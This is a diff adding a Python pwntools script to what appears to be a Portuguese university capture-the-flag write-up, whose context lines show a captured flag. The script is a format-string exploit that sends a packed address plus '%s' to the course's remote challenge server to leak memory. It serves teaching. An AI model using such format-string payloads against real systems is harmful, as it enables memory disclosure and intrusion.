@@ -63,3 +63,44 @@ Alterar o endereço para o mesmo que flag?
 
 FLAG   
  <pre>flag{5fc247063bea425edc863667ac9d09bc}</pre>
+
+### Python
+
+```py
+#!/usr/bin/env python3
+from pwn import *
+ 
+LOCAL = False
+ 
+if LOCAL:
+    #p = process("./program")
+    """
+    O pause() para este script e permite-te usar o gdb para dar attach ao processo
+    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
+    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
+    Depois correr o gdb de forma a dar attach. 
+    (Exemplo: `$ gdb attach 9717` )
+    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
+    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
+    """
+    local = './program'
+    url = 'ctf-fsi.fe.up.pt'
+    port = 4000
+    p = process(local)
+ 
+else:    
+    p = remote("ctf-fsi.fe.up.pt", 4004)
+ 
+p.recvuntil(b":")
+
+content = bytearray(0x00 for i in range(32))
+val = 0x0804c060
+content[0:4] = (val).to_bytes(4, byteorder='little')
+content[4:6] = ("%s").encode('latin-1')
+
+p.sendline(content)
+p.interactive()
+p.recvuntil(b"got:")
+p.sendline(b"oi")
+p.interactive()
+```
